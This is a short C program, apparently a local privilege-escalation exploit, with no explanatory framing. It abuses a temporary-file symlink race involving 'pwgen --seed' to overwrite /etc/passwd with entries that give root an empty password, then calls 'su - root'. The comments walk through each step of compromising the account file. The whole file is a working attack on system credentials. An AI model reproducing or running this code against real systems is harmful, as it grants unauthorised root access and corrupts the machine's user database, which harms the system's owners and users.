#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PWGEN_RANDOM "/tmp/pwgen_random"
#define PASSWD "/etc/passwd"

char *etc_passwd_entries =
    "::1000:1000:johndoe:/home:/bin/sh\n"
    // Empty root password.
    "root::0:0:root:/root:/bin/bash\n";

int main() {
    FILE *fseed;

    // Create a pipe into the seed input.
    fseed = popen("pwgen --seed", "w");
    if (fseed == NULL) {
        printf("Failed to create a pile into pwgen --seed");
        return 1;
    }

    sleep(1);
    // Redirect writes from /tmp/pwgen_random to /etc/passwd.
    remove(PWGEN_RANDOM);
    symlink(PASSWD, PWGEN_RANDOM);
    // Write the compromised root password into the seed input,
    // which ends up in /etc/passwd.
    fprintf(fseed, etc_passwd_entries);
    // Close the pipe to stop pwgen from waiting for more input.
    pclose(fseed);
    sleep(1);

    // Login as root, which now has no password.
    system("su - root");
    return 0;
}
